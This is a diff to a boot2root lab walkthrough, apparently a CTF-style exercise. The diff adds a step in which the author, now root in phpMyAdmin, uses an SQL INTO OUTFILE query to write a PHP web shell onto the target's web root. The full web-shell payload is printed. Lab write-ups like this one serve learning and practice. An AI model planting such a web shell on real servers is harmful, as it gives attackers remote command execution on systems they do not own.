@@ -5,9 +5,7 @@ nmap is a network tool usefull to scan an IP and find a lot of data about runnin
 dirb is a web content scanner used to find any hidden or existing web files and directories.
 dirb is included in Kali distribution. It will be easier and practical to set up another VM with Kali on it to carry on.
 
-curl is another way to retrive information with the -k flag to bypass trust chain checks but I could'nt find the other web pages without dirb.
-
-1) Find your IP range:
+1) Find your IP:
 
 ip a
 
@@ -70,3 +68,13 @@ However, we can connect on the website.
 But it is not the ssh credentials yet. It is a way to access the web DB.
 
 11) On https://<BOOT2ROOT_IP>/phpmyadmin, use root as ID and the password given in the mail.
+
+12) We are root on the DB. Phpmyadmin is a GUI to handle table database and to make SQL queries.
+We will try to create a new php page through SQL with the intent to create a webshell.
+
+let's try the request given in this article : https://www.netspi.com/blog/technical-blog/network-pentesting/linux-hacking-case-studies-part-3-phpmyadmin/
+
+SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET[\'cmd\']) {​​system($_GET[\'cmd\']);}​​ ?> </pre></BODY></HTML>"
+INTO OUTFILE '/var/www/forum/cmd.php'
+
+
